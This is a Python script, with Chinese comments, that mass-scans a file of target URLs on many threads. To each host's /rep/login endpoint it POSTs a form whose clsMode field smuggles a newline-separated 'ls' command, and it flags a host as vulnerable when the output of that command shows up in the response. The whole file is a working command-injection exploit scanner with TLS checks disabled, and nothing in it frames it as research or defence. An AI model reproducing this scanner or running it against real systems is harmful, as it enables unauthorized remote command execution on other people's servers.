import argparse
import warnings
from concurrent.futures import ThreadPoolExecutor

import requests

NUM_THREADS = 10  # 默认线程数为10


def send_post_request(url, data):
    hd = {
        "Host": url,
        "Connection": "close",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Windows\"",
        "Origin": f"https://{url}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{url}/rep/login",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }

    try:
        response = requests.post(f"https://{url}/rep/login", headers=hd, data=data, verify=False)
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)


def scan_url(url):
    data = "clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    response = send_post_request(url, data)
    if "etc" in response:
        print(url + " is vuln!")


def main():
    parser = argparse.ArgumentParser(description='发送POST请求的命令行工具')
    parser.add_argument('-f', '--filepath', required=True, help='包含URL列表的txt文件路径')
    parser.add_argument('-t', '--threads', type=int, default=NUM_THREADS, help='线程数，默认为10')
    args = parser.parse_args()

    filepath = args.filepath
    threads = min(args.threads, 100)  # 最大线程数为100
    data = "clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    warnings.filterwarnings("ignore")
    try:
        with open(filepath, 'r') as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        print(f"文件 {filepath} 不存在")
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(scan_url, urls)


if __name__ == '__main__':
    main()